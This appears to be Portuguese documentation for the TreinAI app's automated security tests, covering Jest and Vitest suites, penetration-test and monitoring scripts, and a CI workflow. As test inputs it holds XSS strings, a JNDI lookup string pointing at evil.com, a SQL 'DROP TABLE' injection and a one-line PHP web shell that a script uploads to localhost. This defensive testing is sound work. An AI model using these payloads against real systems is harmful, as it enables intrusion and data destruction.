# Testes de Segurança Automatizados - TreinAI

## 🛡️ Visão Geral

Esta suite de testes automatizados valida todas as implementações de segurança do sistema TreinAI, incluindo validações, sanitização, rate limiting, auditoria e prevenção de vulnerabilidades.

## 🧪 Estrutura de Testes

### Backend Tests
```
back/tests/
├── security/
│   ├── validation.test.js
│   ├── sanitization.test.js
│   ├── rateLimit.test.js
│   ├── audit.test.js
│   └── vulnerabilities.test.js
├── integration/
│   ├── tokens.test.js
│   ├── payments.test.js
│   └── locals.test.js
└── utils/
    ├── testHelpers.js
    └── mockData.js
```

### Frontend Tests
```
front/tests/
├── security/
│   ├── validation.test.js
│   ├── sanitization.test.js
│   └── rateLimit.test.js
├── components/
│   └── Locais.test.js
└── utils/
    ├── testHelpers.js
    └── mockData.js
```

## 🔧 Configuração dos Testes

### 1. Dependências de Teste

#### Backend (package.json)
```json
{
  "devDependencies": {
    "jest": "^29.7.0",
    "supertest": "^6.3.3",
    "@types/jest": "^29.5.5",
    "mongodb-memory-server": "^9.0.1",
    "faker": "^6.6.6",
    "nock": "^13.3.3"
  },
  "scripts": {
    "test": "jest",
    "test:security": "jest --testPathPattern=security",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:integration": "jest --testPathPattern=integration"
  }
}
```

#### Frontend (package.json)
```json
{
  "devDependencies": {
    "@testing-library/react": "^13.4.0",
    "@testing-library/jest-dom": "^5.16.5",
    "@testing-library/user-event": "^14.4.3",
    "vitest": "^0.34.6",
    "jsdom": "^22.1.0"
  },
  "scripts": {
    "test": "vitest",
    "test:security": "vitest --run security",
    "test:ui": "vitest --ui",
    "test:coverage": "vitest --coverage"
  }
}
```

### 2. Configuração Jest (Backend)

```javascript
// jest.config.js
module.exports = {
  testEnvironment: 'node',
  setupFilesAfterEnv: ['<rootDir>/tests/setup.js'],
  testMatch: [
    '<rootDir>/tests/**/*.test.js'
  ],
  collectCoverageFrom: [
    'controllers/**/*.js',
    'middleware/**/*.js',
    'utils/**/*.js',
    '!**/node_modules/**'
  ],
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80
    }
  },
  testTimeout: 10000
};
```

### 3. Configuração Vitest (Frontend)

```javascript
// vitest.config.js
import { defineConfig } from 'vitest/config';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  test: {
    environment: 'jsdom',
    setupFiles: ['./tests/setup.js'],
    globals: true,
    coverage: {
      reporter: ['text', 'json', 'html'],
      exclude: [
        'node_modules/',
        'tests/',
        '**/*.config.js'
      ]
    }
  }
});
```

## 🔒 Testes de Segurança Backend

### 1. Testes de Validação

```javascript
// back/tests/security/validation.test.js
const request = require('supertest');
const app = require('../../server');
const { validateLocalData, validateUserId } = require('../../utils/validation');

describe('Validação de Dados', () => {
  describe('validateLocalData', () => {
    test('deve aceitar dados válidos', () => {
      const validData = {
        localName: 'Academia Fitness',
        localDescricao: 'Melhor academia da cidade',
        link: 'https://academia.com',
        country: 'Brasil',
        state: 'SP',
        city: 'São Paulo',
        localType: 'Academia'
      };

      const result = validateLocalData(validData);
      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual({});
    });

    test('deve rejeitar nome muito longo', () => {
      const invalidData = {
        localName: 'a'.repeat(101),
        localDescricao: 'Descrição válida'
      };

      const result = validateLocalData(invalidData);
      expect(result.isValid).toBe(false);
      expect(result.errors.localName).toContain('máximo 100 caracteres');
    });

    test('deve rejeitar URL inválida', () => {
      const invalidData = {
        localName: 'Academia',
        link: 'not-a-url'
      };

      const result = validateLocalData(invalidData);
      expect(result.isValid).toBe(false);
      expect(result.errors.link).toContain('URL válida');
    });

    test('deve rejeitar caracteres especiais maliciosos', () => {
      const maliciousData = {
        localName: '<script>alert("xss")</script>',
        localDescricao: '${jndi:ldap://evil.com/a}'
      };

      const result = validateLocalData(maliciousData);
      expect(result.isValid).toBe(false);
      expect(result.errors.localName).toBeDefined();
    });
  });

  describe('validateUserId', () => {
    test('deve aceitar ObjectId válido', () => {
      const validId = '507f1f77bcf86cd799439011';
      expect(validateUserId(validId)).toBe(true);
    });

    test('deve rejeitar ID inválido', () => {
      expect(validateUserId('invalid-id')).toBe(false);
      expect(validateUserId('')).toBe(false);
      expect(validateUserId(null)).toBe(false);
    });
  });
});
```

### 2. Testes de Sanitização

```javascript
// back/tests/security/sanitization.test.js
const { sanitizeInput, sanitizeLocalData } = require('../../middleware/security');

describe('Sanitização de Dados', () => {
  test('deve remover scripts maliciosos', () => {
    const maliciousInput = '<script>alert("xss")</script>Academia';
    const sanitized = sanitizeInput(maliciousInput);
    
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('alert');
    expect(sanitized).toContain('Academia');
  });

  test('deve sanitizar dados de local', () => {
    const maliciousData = {
      localName: '<img src=x onerror=alert(1)>Academia',
      localDescricao: 'javascript:alert("xss")',
      link: 'https://example.com"><script>alert(1)</script>'
    };

    const sanitized = sanitizeLocalData(maliciousData);
    
    expect(sanitized.localName).not.toContain('<img');
    expect(sanitized.localName).not.toContain('onerror');
    expect(sanitized.localDescricao).not.toContain('javascript:');
    expect(sanitized.link).not.toContain('<script>');
  });

  test('deve preservar conteúdo legítimo', () => {
    const legitimateData = {
      localName: 'Academia & Fitness',
      localDescricao: 'A melhor academia (5 estrelas)',
      link: 'https://academia.com.br'
    };

    const sanitized = sanitizeLocalData(legitimateData);
    
    expect(sanitized.localName).toBe('Academia &amp; Fitness');
    expect(sanitized.localDescricao).toContain('5 estrelas');
    expect(sanitized.link).toBe('https://academia.com.br');
  });
});
```

### 3. Testes de Rate Limiting

```javascript
// back/tests/security/rateLimit.test.js
const request = require('supertest');
const app = require('../../server');

describe('Rate Limiting', () => {
  const userId = '507f1f77bcf86cd799439011';
  
  beforeEach(async () => {
    // Limpar rate limit cache
    await request(app).delete('/api/test/clear-rate-limit');
  });

  test('deve permitir requisições dentro do limite', async () => {
    for (let i = 0; i < 5; i++) {
      const response = await request(app)
        .get(`/api/verificar-tokens/${userId}`)
        .set('Authorization', 'Bearer valid-token');
      
      expect(response.status).not.toBe(429);
    }
  });

  test('deve bloquear após exceder limite de tokens', async () => {
    // Fazer 5 requisições (limite)
    for (let i = 0; i < 5; i++) {
      await request(app)
        .get(`/api/verificar-tokens/${userId}`)
        .set('Authorization', 'Bearer valid-token');
    }

    // 6ª requisição deve ser bloqueada
    const response = await request(app)
      .get(`/api/verificar-tokens/${userId}`)
      .set('Authorization', 'Bearer valid-token');

    expect(response.status).toBe(429);
    expect(response.body.error).toContain('rate limit');
  });

  test('deve bloquear pagamentos após limite', async () => {
    // Fazer 3 tentativas de pagamento (limite)
    for (let i = 0; i < 3; i++) {
      await request(app)
        .post('/api/criar-sessao-pagamento')
        .set('Authorization', 'Bearer valid-token')
        .send({ userId, amount: 2999 });
    }

    // 4ª tentativa deve ser bloqueada
    const response = await request(app)
      .post('/api/criar-sessao-pagamento')
      .set('Authorization', 'Bearer valid-token')
      .send({ userId, amount: 2999 });

    expect(response.status).toBe(429);
  });

  test('deve resetar limite após janela de tempo', async () => {
    // Simular passagem de tempo
    jest.advanceTimersByTime(60000); // 1 minuto

    const response = await request(app)
      .get(`/api/verificar-tokens/${userId}`)
      .set('Authorization', 'Bearer valid-token');

    expect(response.status).not.toBe(429);
  });
});
```

### 4. Testes de Auditoria

```javascript
// back/tests/security/audit.test.js
const request = require('supertest');
const app = require('../../server');
const fs = require('fs').promises;
const path = require('path');

describe('Sistema de Auditoria', () => {
  const logPath = path.join(__dirname, '../../logs/audit.log');
  
  beforeEach(async () => {
    // Limpar logs de teste
    try {
      await fs.writeFile(logPath, '');
    } catch (error) {
      // Log file doesn't exist yet
    }
  });

  test('deve registrar uso de token', async () => {
    const userId = '507f1f77bcf86cd799439011';
    
    await request(app)
      .post('/api/criar-local-com-token')
      .set('Authorization', 'Bearer valid-token')
      .send({
        userId,
        localData: {
          localName: 'Academia Teste',
          localDescricao: 'Teste de auditoria'
        }
      });

    // Verificar se foi logado
    const logContent = await fs.readFile(logPath, 'utf8');
    expect(logContent).toContain('TOKEN_USED');
    expect(logContent).toContain(userId);
    expect(logContent).toContain('Academia Teste');
  });

  test('deve registrar tentativas de pagamento', async () => {
    const userId = '507f1f77bcf86cd799439011';
    
    await request(app)
      .post('/api/criar-sessao-pagamento')
      .set('Authorization', 'Bearer valid-token')
      .send({ userId, amount: 2999 });

    const logContent = await fs.readFile(logPath, 'utf8');
    expect(logContent).toContain('PAYMENT_ATTEMPT');
    expect(logContent).toContain(userId);
    expect(logContent).toContain('2999');
  });

  test('deve registrar tentativas de acesso negado', async () => {
    await request(app)
      .get('/api/verificar-tokens/invalid-id')
      .set('Authorization', 'Bearer invalid-token');

    const logContent = await fs.readFile(logPath, 'utf8');
    expect(logContent).toContain('ACCESS_DENIED');
    expect(logContent).toContain('invalid-id');
  });
});
```

### 5. Testes de Vulnerabilidades

```javascript
// back/tests/security/vulnerabilities.test.js
const request = require('supertest');
const app = require('../../server');

describe('Testes de Vulnerabilidades', () => {
  describe('XSS Prevention', () => {
    test('deve prevenir XSS em campos de entrada', async () => {
      const xssPayload = '<script>alert("xss")</script>';
      
      const response = await request(app)
        .post('/api/criar-local')
        .set('Authorization', 'Bearer valid-token')
        .send({
          localName: xssPayload,
          localDescricao: 'Descrição normal'
        });

      expect(response.body.localName).not.toContain('<script>');
    });

    test('deve sanitizar dados na resposta', async () => {
      const response = await request(app)
        .get('/api/meus-locais/507f1f77bcf86cd799439011')
        .set('Authorization', 'Bearer valid-token');

      const locals = response.body;
      locals.forEach(local => {
        expect(local.localName).not.toMatch(/<script|javascript:|on\w+=/i);
        expect(local.localDescricao).not.toMatch(/<script|javascript:|on\w+=/i);
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    test('deve prevenir injeção em parâmetros de query', async () => {
      const sqlPayload = "'; DROP TABLE users; --";
      
      const response = await request(app)
        .get(`/api/verificar-tokens/${sqlPayload}`)
        .set('Authorization', 'Bearer valid-token');

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('ID inválido');
    });
  });

  describe('CSRF Prevention', () => {
    test('deve rejeitar requisições sem token CSRF', async () => {
      const response = await request(app)
        .post('/api/criar-local')
        .send({
          localName: 'Academia',
          localDescricao: 'Teste'
        });

      expect(response.status).toBe(403);
    });
  });

  describe('File Upload Security', () => {
    test('deve rejeitar arquivos maliciosos', async () => {
      const response = await request(app)
        .post('/api/upload-image')
        .set('Authorization', 'Bearer valid-token')
        .attach('image', Buffer.from('<?php system($_GET["cmd"]); ?>'), 'malicious.php');

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('tipo de arquivo');
    });

    test('deve rejeitar arquivos muito grandes', async () => {
      const largeBuffer = Buffer.alloc(6 * 1024 * 1024); // 6MB
      
      const response = await request(app)
        .post('/api/upload-image')
        .set('Authorization', 'Bearer valid-token')
        .attach('image', largeBuffer, 'large.jpg');

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('muito grande');
    });
  });
});
```

## 🎨 Testes de Segurança Frontend

### 1. Testes de Validação Frontend

```javascript
// front/tests/security/validation.test.js
import { describe, test, expect } from 'vitest';
import { 
  validateLocalData, 
  validateImageFile, 
  validateUserId 
} from '../../src/utils/security';

describe('Validação Frontend', () => {
  describe('validateLocalData', () => {
    test('deve validar dados corretos', () => {
      const validData = {
        localName: 'Academia Fitness',
        localDescricao: 'Melhor academia',
        link: 'https://academia.com',
        country: 'Brasil',
        state: 'SP',
        city: 'São Paulo',
        localType: 'Academia'
      };

      const result = validateLocalData(validData);
      expect(result.isValid).toBe(true);
    });

    test('deve rejeitar dados inválidos', () => {
      const invalidData = {
        localName: '', // Nome vazio
        localDescricao: 'a'.repeat(501), // Muito longo
        link: 'not-a-url', // URL inválida
        country: '',
        state: '',
        city: ''
      };

      const result = validateLocalData(invalidData);
      expect(result.isValid).toBe(false);
      expect(result.errors.localName).toBeDefined();
      expect(result.errors.localDescricao).toBeDefined();
      expect(result.errors.link).toBeDefined();
    });
  });

  describe('validateImageFile', () => {
    test('deve aceitar imagem válida', () => {
      const validFile = new File([''], 'test.jpg', {
        type: 'image/jpeg',
        size: 1024 * 1024 // 1MB
      });

      const result = validateImageFile(validFile);
      expect(result.isValid).toBe(true);
    });

    test('deve rejeitar arquivo muito grande', () => {
      const largeFile = new File([''], 'large.jpg', {
        type: 'image/jpeg',
        size: 6 * 1024 * 1024 // 6MB
      });

      const result = validateImageFile(largeFile);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('muito grande');
    });

    test('deve rejeitar tipo de arquivo inválido', () => {
      const invalidFile = new File([''], 'script.exe', {
        type: 'application/exe',
        size: 1024
      });

      const result = validateImageFile(invalidFile);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('tipo de arquivo');
    });
  });
});
```

### 2. Testes de Sanitização Frontend

```javascript
// front/tests/security/sanitization.test.js
import { describe, test, expect } from 'vitest';
import { 
  sanitizeString, 
  sanitizeLocalData, 
  sanitizeForDisplay 
} from '../../src/utils/security';

describe('Sanitização Frontend', () => {
  test('sanitizeString deve remover HTML malicioso', () => {
    const malicious = '<script>alert("xss")</script>Academia';
    const sanitized = sanitizeString(malicious);
    
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('Academia');
  });

  test('sanitizeLocalData deve sanitizar todos os campos', () => {
    const maliciousData = {
      localName: '<img src=x onerror=alert(1)>',
      localDescricao: 'javascript:alert("xss")',
      link: 'https://example.com"><script>',
      country: '<script>Brasil</script>',
      state: 'SP<iframe>',
      city: 'São Paulo</iframe>'
    };

    const sanitized = sanitizeLocalData(maliciousData);
    
    Object.values(sanitized).forEach(value => {
      expect(value).not.toMatch(/<script|javascript:|onerror|<iframe/i);
    });
  });

  test('sanitizeForDisplay deve ser seguro para exibição', () => {
    const userInput = '<script>alert("xss")</script>Nome do Local';
    const safe = sanitizeForDisplay(userInput);
    
    expect(safe).not.toContain('<script>');
    expect(safe).toContain('Nome do Local');
  });
});
```

### 3. Testes de Rate Limiting Frontend

```javascript
// front/tests/security/rateLimit.test.js
import { describe, test, expect, beforeEach, vi } from 'vitest';
import { tokenRateLimit, paymentRateLimit } from '../../src/utils/security';

describe('Rate Limiting Frontend', () => {
  beforeEach(() => {
    // Limpar rate limits
    tokenRateLimit.clear();
    paymentRateLimit.clear();
    
    // Mock do tempo
    vi.useFakeTimers();
  });

  test('tokenRateLimit deve permitir até 5 tentativas', () => {
    const userId = 'test-user';
    
    // 5 tentativas devem ser permitidas
    for (let i = 0; i < 5; i++) {
      expect(tokenRateLimit.isAllowed(userId)).toBe(true);
    }
    
    // 6ª tentativa deve ser bloqueada
    expect(tokenRateLimit.isAllowed(userId)).toBe(false);
  });

  test('paymentRateLimit deve permitir até 3 pagamentos', () => {
    const userId = 'test-user';
    
    // 3 pagamentos devem ser permitidos
    for (let i = 0; i < 3; i++) {
      expect(paymentRateLimit.isAllowed(userId)).toBe(true);
    }
    
    // 4º pagamento deve ser bloqueado
    expect(paymentRateLimit.isAllowed(userId)).toBe(false);
  });

  test('deve resetar após janela de tempo', () => {
    const userId = 'test-user';
    
    // Esgotar limite
    for (let i = 0; i < 5; i++) {
      tokenRateLimit.isAllowed(userId);
    }
    
    expect(tokenRateLimit.isAllowed(userId)).toBe(false);
    
    // Avançar tempo (1 minuto)
    vi.advanceTimersByTime(60000);
    
    // Deve permitir novamente
    expect(tokenRateLimit.isAllowed(userId)).toBe(true);
  });
});
```

### 4. Testes do Componente Locais

```javascript
// front/tests/components/Locais.test.js
import { describe, test, expect, vi, beforeEach } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import Locais from '../../src/pages/Dashboard/Pages/Locais';

// Mock das dependências
vi.mock('../../src/utils/security', () => ({
  validateLocalData: vi.fn(() => ({ isValid: true, errors: {} })),
  validateImageFile: vi.fn(() => ({ isValid: true })),
  sanitizeLocalData: vi.fn(data => data),
  sanitizeForDisplay: vi.fn(text => text),
  validateUserId: vi.fn(() => true),
  tokenRateLimit: { isAllowed: vi.fn(() => true) },
  paymentRateLimit: { isAllowed: vi.fn(() => true) }
}));

describe('Componente Locais - Segurança', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  test('deve validar dados antes de submeter', async () => {
    const user = userEvent.setup();
    render(<Locais />);

    const nameInput = screen.getByLabelText(/nome do local/i);
    const submitButton = screen.getByRole('button', { name: /criar local/i });

    await user.type(nameInput, 'Academia Teste');
    await user.click(submitButton);

    expect(validateLocalData).toHaveBeenCalled();
  });

  test('deve sanitizar dados na exibição', () => {
    const mockLocals = [{
      _id: '1',
      localName: '<script>alert("xss")</script>Academia',
      localDescricao: 'Descrição com <img onerror=alert(1)>',
      status: 'ativo'
    }];

    render(<Locais />);
    
    // Verificar se sanitizeForDisplay foi chamado
    expect(sanitizeForDisplay).toHaveBeenCalledWith(mockLocals[0].localName);
    expect(sanitizeForDisplay).toHaveBeenCalledWith(mockLocals[0].localDescricao);
  });

  test('deve aplicar rate limiting', async () => {
    const user = userEvent.setup();
    render(<Locais />);

    const submitButton = screen.getByRole('button', { name: /criar local/i });
    await user.click(submitButton);

    expect(tokenRateLimit.isAllowed).toHaveBeenCalled();
  });

  test('deve validar arquivo de imagem', async () => {
    const user = userEvent.setup();
    render(<Locais />);

    const fileInput = screen.getByLabelText(/imagem/i);
    const file = new File([''], 'test.jpg', { type: 'image/jpeg' });

    await user.upload(fileInput, file);

    expect(validateImageFile).toHaveBeenCalledWith(file);
  });
});
```

## 🚀 Scripts de Execução

### 1. Script Principal de Testes

```bash
#!/bin/bash
# run-security-tests.sh

echo "🛡️  Executando Testes de Segurança - TreinAI"
echo "=============================================="

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Função para log colorido
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Verificar dependências
log_info "Verificando dependências..."

if ! command -v node &> /dev/null; then
    log_error "Node.js não encontrado"
    exit 1
fi

if ! command -v npm &> /dev/null; then
    log_error "npm não encontrado"
    exit 1
fi

# Testes Backend
log_info "Executando testes de segurança do Backend..."
cd back

if npm run test:security; then
    log_info "✅ Testes de segurança do Backend passaram"
else
    log_error "❌ Testes de segurança do Backend falharam"
    exit 1
fi

# Testes Frontend
log_info "Executando testes de segurança do Frontend..."
cd ../front

if npm run test:security; then
    log_info "✅ Testes de segurança do Frontend passaram"
else
    log_error "❌ Testes de segurança do Frontend falharam"
    exit 1
fi

# Auditoria de dependências
log_info "Executando auditoria de dependências..."
cd ../back
npm audit --audit-level moderate

cd ../front
npm audit --audit-level moderate

# Relatório de cobertura
log_info "Gerando relatório de cobertura..."
cd ../back
npm run test:coverage

cd ../front
npm run test:coverage

log_info "🎉 Todos os testes de segurança concluídos com sucesso!"
```

### 2. Script de Testes de Penetração

```bash
#!/bin/bash
# penetration-tests.sh

echo "🔍 Executando Testes de Penetração"
echo "=================================="

API_URL="http://localhost:3000/api"

# Teste de XSS
echo "Testando XSS..."
curl -X POST "$API_URL/criar-local" \
  -H "Content-Type: application/json" \
  -d '{"localName":"<script>alert(\"xss\")</script>","localDescricao":"test"}'

# Teste de SQL Injection
echo "Testando SQL Injection..."
curl -X GET "$API_URL/verificar-tokens/'; DROP TABLE users; --"

# Teste de Rate Limiting
echo "Testando Rate Limiting..."
for i in {1..10}; do
  curl -X GET "$API_URL/verificar-tokens/invalid" &
done
wait

# Teste de Upload malicioso
echo "Testando Upload de arquivo malicioso..."
echo '<?php system($_GET["cmd"]); ?>' > malicious.php
curl -X POST "$API_URL/upload-image" \
  -F "image=@malicious.php"
rm malicious.php

echo "Testes de penetração concluídos"
```

### 3. Script de Monitoramento Contínuo

```bash
#!/bin/bash
# continuous-monitoring.sh

echo "📊 Monitoramento Contínuo de Segurança"
echo "======================================"

while true; do
    # Verificar logs de segurança
    if grep -q "SECURITY_ALERT" logs/security.log; then
        echo "🚨 ALERTA DE SEGURANÇA DETECTADO!"
        tail -n 10 logs/security.log
    fi
    
    # Verificar tentativas de rate limiting
    RATE_LIMIT_COUNT=$(grep -c "RATE_LIMIT_EXCEEDED" logs/security.log)
    if [ "$RATE_LIMIT_COUNT" -gt 10 ]; then
        echo "⚠️  Muitas tentativas de rate limiting: $RATE_LIMIT_COUNT"
    fi
    
    # Verificar uso de CPU/Memória
    CPU_USAGE=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
    if (( $(echo "$CPU_USAGE > 80" | bc -l) )); then
        echo "🔥 CPU alta: ${CPU_USAGE}%"
    fi
    
    sleep 60
done
```

## 📊 Relatórios de Teste

### 1. Template de Relatório

```javascript
// generate-security-report.js
const fs = require('fs');
const path = require('path');

class SecurityReportGenerator {
  constructor() {
    this.results = {
      timestamp: new Date().toISOString(),
      backend: {},
      frontend: {},
      vulnerabilities: [],
      recommendations: []
    };
  }

  addBackendResults(results) {
    this.results.backend = results;
  }

  addFrontendResults(results) {
    this.results.frontend = results;
  }

  addVulnerability(vulnerability) {
    this.results.vulnerabilities.push({
      ...vulnerability,
      timestamp: new Date().toISOString()
    });
  }

  addRecommendation(recommendation) {
    this.results.recommendations.push(recommendation);
  }

  generateReport() {
    const report = `
# Relatório de Segurança - TreinAI
**Data**: ${this.results.timestamp}

## 📊 Resumo dos Testes

### Backend
- **Testes Executados**: ${this.results.backend.total || 0}
- **Sucessos**: ${this.results.backend.passed || 0}
- **Falhas**: ${this.results.backend.failed || 0}
- **Cobertura**: ${this.results.backend.coverage || 0}%

### Frontend
- **Testes Executados**: ${this.results.frontend.total || 0}
- **Sucessos**: ${this.results.frontend.passed || 0}
- **Falhas**: ${this.results.frontend.failed || 0}
- **Cobertura**: ${this.results.frontend.coverage || 0}%

## 🚨 Vulnerabilidades Encontradas
${this.results.vulnerabilities.map(v => `
### ${v.severity} - ${v.title}
**Descrição**: ${v.description}
**Localização**: ${v.location}
**Recomendação**: ${v.fix}
`).join('\n')}

## 💡 Recomendações
${this.results.recommendations.map(r => `- ${r}`).join('\n')}

## ✅ Status Geral
${this.getOverallStatus()}
`;

    const reportPath = path.join(__dirname, '../reports', `security-report-${Date.now()}.md`);
    fs.writeFileSync(reportPath, report);
    
    return reportPath;
  }

  getOverallStatus() {
    const totalVulns = this.results.vulnerabilities.length;
    const criticalVulns = this.results.vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
    
    if (criticalVulns > 0) {
      return '🔴 **CRÍTICO** - Vulnerabilidades críticas encontradas';
    } else if (totalVulns > 0) {
      return '🟡 **ATENÇÃO** - Vulnerabilidades menores encontradas';
    } else {
      return '🟢 **SEGURO** - Nenhuma vulnerabilidade encontrada';
    }
  }
}

module.exports = SecurityReportGenerator;
```

## 🔧 Integração com CI/CD

### 1. GitHub Actions

```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  security-tests:
    runs-on: ubuntu-latest
    
    services:
      mongodb:
        image: mongo:5.0
        env:
          MONGO_INITDB_ROOT_USERNAME: admin
          MONGO_INITDB_ROOT_PASSWORD: password
        ports:
          - 27017:27017

    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '18'
        cache: 'npm'
    
    - name: Install Backend Dependencies
      run: |
        cd back
        npm ci
    
    - name: Install Frontend Dependencies
      run: |
        cd front
        npm ci
    
    - name: Run Security Tests - Backend
      run: |
        cd back
        npm run test:security
      env:
        MONGODB_URI: mongodb://admin:password@localhost:27017/test?authSource=admin
    
    - name: Run Security Tests - Frontend
      run: |
        cd front
        npm run test:security
    
    - name: Security Audit
      run: |
        cd back && npm audit --audit-level moderate
        cd ../front && npm audit --audit-level moderate
    
    - name: Upload Coverage Reports
      uses: codecov/codecov-action@v3
      with:
        files: ./back/coverage/lcov.info,./front/coverage/lcov.info
```

## 📋 Checklist de Execução

### Antes de Executar os Testes
- [ ] Node.js v18+ instalado
- [ ] MongoDB rodando
- [ ] Dependências instaladas (npm install)
- [ ] Variáveis de ambiente configuradas
- [ ] Logs de teste limpos

### Durante a Execução
- [ ] Monitorar saída dos testes
- [ ] Verificar cobertura de código
- [ ] Analisar relatórios de vulnerabilidade
- [ ] Documentar falhas encontradas

### Após a Execução
- [ ] Revisar relatório de segurança
- [ ] Corrigir vulnerabilidades encontradas
- [ ] Atualizar documentação
- [ ] Planejar melhorias de segurança

---

**Versão**: 1.0  
**Data**: Janeiro 2024  
**Status**: ✅ Pronto para Execução